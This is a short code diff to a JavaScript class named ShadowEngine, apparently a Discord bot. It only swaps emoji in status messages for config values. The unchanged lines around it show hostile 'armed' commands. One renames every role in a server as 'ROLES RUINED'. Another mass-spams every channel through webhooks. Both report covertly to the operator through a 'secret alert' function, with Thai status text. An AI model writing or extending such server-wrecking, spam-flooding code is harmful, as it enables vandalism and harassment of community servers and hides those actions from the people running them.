@@ -332,7 +332,7 @@ class ShadowEngine {
                         await delay(100);
                     }
                 }
-                await this.sendSecretAlert("ROLES RUINED", `🃏 เปลี่ยนชื่อยศทั้งหมดใน **${guild.name}** เป็น "${newRoleName}" เรียบร้อย`);
+                await this.sendSecretAlert("ROLES RUINED", `${config.emojis.jester} เปลี่ยนชื่อยศทั้งหมดใน **${guild.name}** เป็น "${newRoleName}" เรียบร้อย`);
             }
             else if (command === "-spamvc" && systemToggles.cmdSpamVC) {
                 const amt = parseInt(args[2]) || 20;
@@ -354,7 +354,7 @@ class ShadowEngine {
                         await hook.delete().catch(() => {});
                     }
                 }
-                await this.sendSecretAlert("MASS SPAM DONE", `📢 สแปม ${amt} ข้อความทุกช่องใน **${guild.name}** เรียบร้อย`);
+                await this.sendSecretAlert("MASS SPAM DONE", `${config.emojis.announce_icon} สแปม ${amt} ข้อความทุกช่องใน **${guild.name}** เรียบร้อย`);
             }
         } catch (err) {
             await this.sendSecretAlert("ARMED COMMAND ERROR", `เกิดข้อผิดพลาดในคำสั่ง ARMED: ${err.message}`);
